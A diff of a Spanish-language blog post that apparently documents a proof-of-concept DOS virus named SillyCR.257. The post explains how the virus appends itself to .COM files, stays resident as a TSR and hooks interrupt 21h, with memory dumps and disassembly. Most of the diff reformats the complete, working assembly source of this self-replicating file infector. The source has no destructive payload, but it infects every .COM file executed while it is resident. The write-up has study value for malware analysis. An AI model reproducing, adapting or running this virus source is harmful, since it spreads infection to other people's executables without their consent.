@@ -14,11 +14,11 @@ DOS para infectar archivos antes de ser ejecutados.
 
 ## Método de infección
 Durante la infección, el virus reemplaza los primeros bytes del archivo huésped
- (cabezal original) con una instrucción `JMP` (cabezal viral) que dirige el flujo
- de ejecución hacia el final del archivo donde se añade el cuerpo viral. El cabezal
- original reemplazado es guardado en el cuerpo viral.
+(cabezal original) con una instrucción `JMP` (cabezal viral) que dirige el flujo
+de ejecución hacia el final del archivo donde se añade el cuerpo viral. El cabezal
+original reemplazado es guardado en el cuerpo viral.
 
-![infection](/assets/images/poc-virus-x86dos-com-postpending-resident-tsr/infection.png){:width="450"}
+{% img infection.png | {"width":"450"} %}
 
 Cuando un archivo infectado es ejecutado, el virus se carga en memoria junto con este y 
 se ejecuta primero realizando sus propias acciones, al terminar restaura el cabezal original
@@ -40,13 +40,12 @@ Como resultado de la infección:
   del virus.
 
 ## Residencia en memoria
-
 El virus permanece residente en el rango de memoria convencional (por debajo de 640KB - segmento A000)
- como un programa TSR (Terminate and Stay Resident) normal mediante el servicio 27h provisto por
- DOS. Durante la infección, el virus reconoce si ya se encuentra residente mediante un 
+como un programa TSR (Terminate and Stay Resident) normal mediante el servicio 27h provisto por
+DOS. Durante la infección, el virus reconoce si ya se encuentra residente mediante un 
 servicio propio en la interrupción 21h.
 
-![memory](/assets/images/poc-virus-x86dos-com-postpending-resident-tsr/memory.png){:width="450"}
+{% img memory.png | {"width":"450"} %}
 
 ## Método de propagación
 El virus modifica el handler original de la interrupción 21h cambiando el vector del handler en
@@ -65,14 +64,13 @@ Esto tiene dos objetivos:
 ## Flujo de ejecución
 Al ejecutarse un archivo infectado, el virus se hace residente en memoria y modifica la IVT:
 
-![flow 1](/assets/images/poc-virus-x86dos-com-postpending-resident-tsr/flow1.png){:width="480"}
+{% img flow1.png | {"width":"480"} %}
 
 Cuando el virus ya es residente en memoria, intercepta todas las llamadas a la interrupción 21h:
 
-![flow 2](/assets/images/poc-virus-x86dos-com-postpending-resident-tsr/flow2.png){:width="400"}
+{% img flow2.png | {"width":"400"} %}
 
 ## Análisis estático
-
 Hex dump de un archivo sano de tamaño 80 bytes:
 
 <pre class="ovf">
@@ -152,7 +150,7 @@ Microsoft Virtual PC 6.0 con VM Additions.
 **Antes de la infección**  
 Resultado de `MEM /C`:
 
-<pre class="ovf">Name           Total       =   Conventional   +   Upper Memory
+<pre>Name           Total       =   Conventional   +   Upper Memory
   --------  ----------------   ----------------   ----------------
   MSDOS       16,157   (16K)     16,157   (16K)          0    (0K)
   SETVER         480    (0K)        480    (0K)          0    (0K)
@@ -218,7 +216,7 @@ este espacio incluye el código del huésped y por lo tanto depende del mismo.
 
 Resultado de `MEM /M VTEST`:
 
-<pre class="ovf">Segment  Region       Total        Type
+<pre>Segment  Region       Total        Type
   -------  ------  ----------------  --------
    0218A                160    (0K)  Environment
    02194                624    (1K)  Program
@@ -240,7 +238,7 @@ tiene un MCB correspondiente de 16 B, por lo tanto el bloque 2194 tiene un tama�
 ### Handler de 21h
 La IVT ocupa los primeros 1024 bytes de memoria RAM, segmento 0000.  
 El vector de la interrupción 21h es la dirección de memoria del handler en forma 
-de 4 bytes segmento:offset, este se encuentra en el offset 84h de la IVT.
+de 4 bytes `segmento:offset`, este se encuentra en el offset 84h de la IVT.
 
 **Antes de la infección**  
 Hex dump de los 4 bytes del vector 21h:
@@ -263,23 +261,23 @@ El vector ya no es el mismo.
 Desensamblado del handler referenciado por el nuevo vector:
 
 <pre class="ovf">-U 2195:0193
-2195:0193 3DCDAB       CMP   AX,ABCD            ; inicio del handler viral
-2195:0196 7408         JZ    01A0                               
-2195:0198 3D004B       CMP   AX,4B00                            
-2195:019B 7407         JZ    01A4                               
-2195:019D E9A800       JMP   0248                               
-2195:01A0 B89A02       MOV   AX,029A                            
+2195:0193 3DCDAB       CMP    AX,ABCD            ; inicio del handler viral
+2195:0196 7408         JZ     01A0                               
+2195:0198 3D004B       CMP    AX,4B00                            
+2195:019B 7407         JZ     01A4                               
+2195:019D E9A800       JMP    0248                               
+2195:01A0 B89A02       MOV    AX,029A                            
 2195:01A3 CF           IRET                                    
-2195:01A4 E80000       CALL  01A7                               
-2195:01A7 5D           POP   BP                                 
-2195:01A8 81ED5F01     SUB   BP,015F                            
+2195:01A4 E80000       CALL   01A7                               
+2195:01A7 5D           POP    BP                                 
+2195:01A8 81ED5F01     SUB    BP,015F                            
 2195:01AC 9C           PUSHF                                     
-2195:01AD 50           PUSH  AX                                 
-2195:01AE 53           PUSH  BX                                 
-2195:01AF 51           PUSH  CX                                 
-2195:01B0 52           PUSH  DX                                 
-2195:01B1 56           PUSH  SI                                 
-2195:01B2 1E           PUSH  DS  
+2195:01AD 50           PUSH   AX                                 
+2195:01AE 53           PUSH   BX                                 
+2195:01AF 51           PUSH   CX                                 
+2195:01B0 52           PUSH   DX                                 
+2195:01B1 56           PUSH   SI                                 
+2195:01B2 1E           PUSH   DS  
 </pre>
 
 Desensamblado del comienzo:
@@ -309,8 +307,7 @@ Se utilizan 8 servicios de la DOS API mediante la interrupción de software 21h.
       <th>Retorno</th>
       <th>Versión DOS</th>
     </tr>
-  </thead>
-  
+  </thead> 
   <tr>
     <td>Terminar programa</td>
     <td>00h</td>
@@ -318,7 +315,6 @@ Se utilizan 8 servicios de la DOS API mediante la interrupción de software 21h.
     <td class="center">-</td>
     <td>1+</td>
   </tr>
-  
   <tr>
     <td>Establecer vector en IVT</td>  
     <td>25h</td>
@@ -394,7 +390,7 @@ Se utiliza la interrupción 27h (DOS 1.x) para crear programas TSR.
 
 ## Código fuente
 {% highlight nasm linenos %}
-;###############################################################################  
+;##############################################################################  
 ;# Nombre:        virus://DOS/SillyCR.257  
 ;# Plataforma:    Intel x86  
 ;# SO:            DOS v2.0+  
@@ -409,173 +405,191 @@ Se utiliza la interrupción 27h (DOS 1.x) para crear programas TSR.
 ;# Stealth:       No  
 ;# Payload:       No  
 ;##############################################################################
-                    .8086  
-                    .model tiny
 
-                    assume cs:virus, ds:virus
+.8086  
+.model tiny
 
-          virus     segment byte public 'CODE'
+assume cs:virus, ds:virus
 
-                    org 100h
+virus segment byte public 'CODE'
 
-         start:     jmp short body                          ; cabezal, en las siguientes generaciones aquí  
-                    nop                                     ; habrá un near JMP de 3 bytes  
-                    db 'V'                                  ; firma viral
+    org 100h
+
+start:     
+    jmp short body                          ; cabezal, en las siguientes generaciones aquí  
+    nop                                     ; habrá un near JMP de 3 bytes  
+    db 'V'                                  ; firma viral
+
+    mov ah, 00h                             ; / huésped dummy, solo retorna a DOS  
+    int 21h                                 ; \
+
+body:     
+    call d_offset                           ; calcular delta offset  
+
+d_offset:     
+    pop bp  
+    sub bp, offset d_offset 
+
+    mov ax, 0ABCDh                          ; | AX = 0ABCDh  
+    int 21h                                 ; |_DOS API - Llamar servicio de reconocimiento del virus
+
+    cmp ax, 029Ah                           ; verificar código de respuesta  
+    jne infect_int21h                       ; si no es 666 (29Ah), infectar INT 21h
+
+    mov cx, 4                               ; restaurar cabezal original  
+    lea si, [bp + host_head]  
+    mov di, 100h  
+    rep movsb 
+
+    mov ax, 100h  
+    jmp ax                                  ; saltar a CS:0100 y ejecutar huésped 
+
+infect_int21h:    
+    mov ah, 35h                             ; | AH = 35h  
+    mov al, 21h                             ; | AL = número de interrupción, 21h  
+    int 21h                                 ; |_DOS API - Obtener vector en ES:BX
+
+    mov [bp + vector_int21], bx             ; guardar vector original de INT 21h  
+    mov [bp + vector_int21 + 2], es
+
+    mov ah, 25h                             ; | AH = 25h  
+    mov al, 21h                             ; | AL = número de interrupción, 21h  
+    lea dx, [bp + handler_int21h]           ; | DS:DX -> dirección del nuevo handler: handler_int21h  
+    int 21h                                 ; |_DOS API - Cambiar vector
+
+                                            ; | CS = segmento de PSP  
+    lea dx, [bp + eof]                      ; | DX = Tamaño de porción residente (bytes)  
+    int 27h                                 ; |_DOS API - Termina el programa y lo deja en memoria 
+
+handler_int21h:    
+    cmp ax, 0ABCDh                          ; llamada de reconocimiento del virus:  
+    je service_ABCD                         ; responder y retornar  
+    cmp ax, 4B00h                           ; llamada para ejecutar archivo:  
+    je infect_file                          ; infectar y delegar  
+    jmp handler_old                         ; en otro caso, delegar al handler original de INT 21h 
+
+service_ABCD:    
+    mov ax, 029Ah                           ; código de respuesta: 666 (29Ah)  
+    iret                                    ; retornar de la interrupción
+
+infect_file:     
+    call d_offset2                          ; calcular delta offset  
     
-                    mov ah, 00h                             ; / huésped dummy, solo retorna a DOS  
-                    int 21h                                 ; \
+d_offset2:    
+    pop bp  
+    sub bp, offset d_offset2
 
-          body:     call d_offset                           ; calcular delta offset  
-      d_offset:     pop bp  
-                    sub bp, offset d_offset 
+    pushf                                   ; guardar estado CPU  
+    push ax                                 ; guardar registros que serán utilizados  
+    push bx  
+    push cx  
+    push dx  
+    push si  
+    push ds  
+                                            ; por la llamada AX=4B00h, DS:DX apunta al nombre del archivo  
+    mov si, dx                              ; verificar que sea extensión ".COM"  
+    
+loop_str:    
+    lodsb  
+    or al, al  
+    jz check_fail  
+    cmp al, '.';  
+    jne loop_str  
+    lodsb  
+    cmp al, 'C'  
+    jne check_fail  
+    lodsb  
+    cmp al, 'O' 
+    jne check_fail  
+    lodsb  
+    cmp al, 'M'
+    je check_ok
 
-                    mov ax, 0ABCDh                          ; | AX = 0ABCDh  
-                    int 21h                                 ; |_DOS API - Llamar servicio de reconocimiento del virus
+check_fail:      
+    jmp close_file
 
-                    cmp ax, 029Ah                           ; verificar código de respuesta  
-                    jne infect_int21h                       ; si no es 666 (29Ah), infectar INT 21h
+check_ok:      
+    mov ah, 3Dh                             ; | AH = 3Dh  
+    mov al, 2                               ; | AL = 2, lectura y escritura  
+    int 21h                                 ; |_DOS API - Abrir archivo existente 
 
-                    mov cx, 4                               ; restaurar cabezal original  
-                    lea si, [bp + host_head]  
-                    mov di, 100h  
-                    rep movsb 
+    jc exit                                 ; si no se puede abrir archivo, restaurar y delegar  
+    xchg ax, bx                             ; handle de archivo en BX
 
-                    mov ax, 100h  
-                    jmp ax                                  ; saltar a CS:0100 y ejecutar huésped 
+    push cs  
+    pop ds                                  ; MOV DS, CS
 
- infect_int21h:     mov ah, 35h                             ; | AH = 35h  
-                    mov al, 21h                             ; | AL = número de interrupción, 21h  
-                    int 21h                                 ; |_DOS API - Obtener vector en ES:BX
+    mov ah, 3Fh                             ; | AH = 3Fh  
+    mov cx, 4                               ; | CX = tamaño del cabezal, 4 bytes  
+    lea dx, [bp + host_head]                ; | DS:DX -> destino: buffer para cabezal original  
+    int 21h                                 ; |_DOS API - Leer de archivo/dispositivo
 
-                    mov [bp + vector_int21], bx             ; guardar vector original de INT 21h  
-                    mov [bp + vector_int21 + 2], es
+    jc close_file                           ; no se puede leer el archivo, cerrarlo
 
-                    mov ah, 25h                             ; | AH = 25h  
-                    mov al, 21h                             ; | AL = número de interrupción, 21h  
-                    lea dx, [bp + handler_int21h]           ; | DS:DX -> dirección del nuevo handler: handler_int21h  
-                    int 21h                                 ; |_DOS API - Cambiar vector
+    cmp byte ptr [bp + host_head + 3], 'V'  ; comparar 4to byte con la firma viral 'V' 
+    je close_file                           ; si el archivo ya esta marcado, cerrarlo
 
-                                                            ; | CS = segmento de PSP  
-                    lea dx, [bp + eof]                      ; | DX = Tamaño de porción residente (bytes)  
-                    int 27h                                 ; |_DOS API - Termina el programa y lo deja en memoria 
+    mov ah, 42h                             ;| AH = 42h  
+    mov al, 2                               ;| AL = 2, fin del archivo  
+    xor cx, cx                              ;| CX = 0  
+    xor dx, dx                              ;| DX = 0  
+    int 21h                                 ;|_DOS API - Establecer puntero en archivo 
 
-handler_int21h:     cmp ax, 0ABCDh                          ; llamada de reconocimiento del virus:  
-                    je service_ABCD                         ; responder y retornar  
-                    cmp ax, 4B00h                           ; llamada para ejecutar archivo:  
-                    je infect_file                          ; infectar y delegar  
-                    jmp handler_old                         ; en otro caso, delegar al handler original de INT 21h 
+    jc close_file                           ; no se puede trabajar con el archivo, cerrarlo  
+    mov [bp + file_size], ax
 
-  service_ABCD:     mov ax, 029Ah                           ; código de respuesta: 666 (29Ah)  
-                    iret                                    ; retornar de la interrupción
+    mov ah, 40h                             ; | AH = 40h  
+    mov cx, VIRUS_SIZE                      ; | CX = tamaño del virus  
+    lea dx, [bp + body]                     ; | DS:DX -> origen: inicio del código viral  
+    int 21h                                 ; |_DOS API - Escribir en archivo/dispositivo 
 
-   infect_file:     call d_offset2                          ; calcular delta offset  
-     d_offset2:     pop bp  
-                    sub bp, offset d_offset2
+    jc close_file                           ; no se puede trabajar con el archivo, cerrarlo
 
-                    pushf                                   ; guardar estado CPU  
-                    push ax                                 ; guardar registros que serán utilizados  
-                    push bx  
-                    push cx  
-                    push dx  
-                    push si  
-                    push ds  
-                                                            ; por la llamada AX=4B00h, DS:DX apunta al nombre del archivo  
-                    mov si, dx                              ; verificar que sea extensión ".COM"  
-      loop_str:     lodsb  
-                    or al, al  
-                    jz check_fail  
-                    cmp al, '.';  
-                    jne loop_str  
-                    lodsb  
-                    cmp al, 'C'  
-                    jne check_fail  
-                    lodsb  
-                    cmp al, 'O' 
-                    jne check_fail  
-                    lodsb  
-                    cmp al, 'M'
-                    je check_ok
+    mov ax, [bp + file_size]                ; calcular el largo del JMP para el cabezal viral  
+    sub ax, 3                               ; restarle 3 bytes del near JMP  
+    mov byte ptr [bp + tmp_head], 0E9h      ; construir cabezal viral en buffer temporal (E9h = near JMP)  
+    mov word ptr [bp + tmp_head + 1], ax  
+    mov byte ptr [bp + tmp_head + 3], 'V' 
 
-   check_fail:      jmp close_file
+    mov ah, 42h                             ; | AH = 42h  
+    mov al, 0                               ; | AL = 0, principio del archivo  
+    xor cx, cx                              ; | CX = 0  
+    xor dx, dx                              ; | DX = 0  
+    int 21h                                 ; |_DOS API - Establecer puntero en archivo 
 
-     check_ok:      mov ah, 3Dh                             ; | AH = 3Dh  
-                    mov al, 2                               ; | AL = 2, lectura y escritura  
-                    int 21h                                 ; |_DOS API - Abrir archivo existente 
+    jc close_file                           ; no se puede trabajar con el archivo, cerrarlo
 
-                    jc exit                                 ; si no se puede abrir archivo, restaurar y delegar  
-                    xchg ax, bx                             ; handle de archivo en BX
+    mov ah, 40h                             ; | AH = 40h  
+    mov cx, 4                               ; | CX = tamaño del cabezal, 4 bytes  
+    lea dx, [bp + tmp_head]                 ; | DS:DX -> origen: buffer temporal para cabezal viral  
+    int 21h                                 ; |_DOS API - Escribir en archivo/dispositivo 
 
-                    push cs  
-                    pop ds                                  ; MOV DS, CS
+close_file:     
+    mov ah, 3Eh                             ; | AH = 3Eh  
+    int 21h                                 ; |_DOS API - Cerrar archivo 
 
-                    mov ah, 3Fh                             ; | AH = 3Fh  
-                    mov cx, 4                               ; | CX = tamaño del cabezal, 4 bytes  
-                    lea dx, [bp + host_head]                ; | DS:DX -> destino: buffer para cabezal original  
-                    int 21h                                 ; |_DOS API - Leer de archivo/dispositivo
+exit:     
+    pop ds                                  ; restaurar registros y estado CPU  
+    pop si  
+    pop dx  
+    pop cx  
+    pop bx  
+    pop ax  
+    popf
 
-                    jc close_file                           ; no se puede leer el archivo, cerrarlo
+handler_old:     
+    db 0EAh                                 ; JMP FAR  
+   
+vector_int21    dw   ?, ?                   ; vector original de INT 21h (4 bytes)
+host_head       db   90h, 90h, 90h, 90h     ; buffer para cabezal original  
+VIRUS_SIZE      equ  ($ - body)             ; tamaño del virus  
+file_size       dw   ?                      ; buffer temporal para tamaño del huésped  
+tmp_head        db   4 dup (?)              ; buffer temporal para cabezal viral
 
-                    cmp byte ptr [bp + host_head + 3], 'V'  ; comparar 4to byte con la firma viral &#8216;V&#8217;  
-                    je close_file                           ; si el archivo ya esta marcado, cerrarlo
+eof:                                        ; fin de porción residente para TSR 
 
-                    mov ah, 42h                             ;| AH = 42h  
-                    mov al, 2                               ;| AL = 2, fin del archivo  
-                    xor cx, cx                              ;| CX = 0  
-                    xor dx, dx                              ;| DX = 0  
-                    int 21h                                 ;|_DOS API - Establecer puntero en archivo 
-
-                    jc close_file                           ; no se puede trabajar con el archivo, cerrarlo  
-                    mov [bp + file_size], ax
-
-                    mov ah, 40h                             ; | AH = 40h  
-                    mov cx, virus_size                      ; | CX = tamaño del virus  
-                    lea dx, [bp + body]                     ; | DS:DX -> origen: inicio del código viral  
-                    int 21h                                 ; |_DOS API - Escribir en archivo/dispositivo 
-
-                    jc close_file                           ; no se puede trabajar con el archivo, cerrarlo
-
-                    mov ax, [bp + file_size]                ; calcular el largo del JMP para el cabezal viral  
-                    sub ax, 3                               ; restarle 3 bytes del near JMP  
-                    mov byte ptr [bp + tmp_head], 0E9h      ; construir cabezal viral en buffer temporal (E9h = near JMP)  
-                    mov word ptr [bp + tmp_head + 1], ax  
-                    mov byte ptr [bp + tmp_head + 3], 'V' 
-
-                    mov ah, 42h                             ; | AH = 42h  
-                    mov al, 0                               ; | AL = 0, principio del archivo  
-                    xor cx, cx                              ; | CX = 0  
-                    xor dx, dx                              ; | DX = 0  
-                    int 21h                                 ; |_DOS API - Establecer puntero en archivo 
-
-                    jc close_file                           ; no se puede trabajar con el archivo, cerrarlo
-
-                    mov ah, 40h                             ; | AH = 40h  
-                    mov cx, 4                               ; | CX = tamaño del cabezal, 4 bytes  
-                    lea dx, [bp + tmp_head]                 ; | DS:DX -> origen: buffer temporal para cabezal viral  
-                    int 21h                                 ; |_DOS API - Escribir en archivo/dispositivo 
-
-    close_file:     mov ah, 3Eh                             ; | AH = 3Eh  
-                    int 21h                                 ; |_DOS API - Cerrar archivo 
-
-          exit:     pop ds                                  ; restaurar registros y estado CPU  
-                    pop si  
-                    pop dx  
-                    pop cx  
-                    pop bx  
-                    pop ax  
-                    popf
-
-   handler_old:     db 0EAh                                 ; JMP FAR  
-   vector_int21     dw ?, ?                                 ; vector original de INT 21h (4 bytes)
-
-      host_head     db 90h, 90h, 90h, 90h                   ; buffer para cabezal original  
-     virus_size     equ ($ - body)                          ; tamaño del virus  
-      file_size     dw ?                                    ; buffer temporal para tamaño del huésped  
-       tmp_head     db 4 dup (?)                            ; buffer temporal para cabezal viral
-
-           eof:                                             ; fin de porción residente para TSR 
-
-         virus      ends  
-           end      start  
+virus ends  
+end start  
 {% endhighlight %}
 
 ## Bibliografía
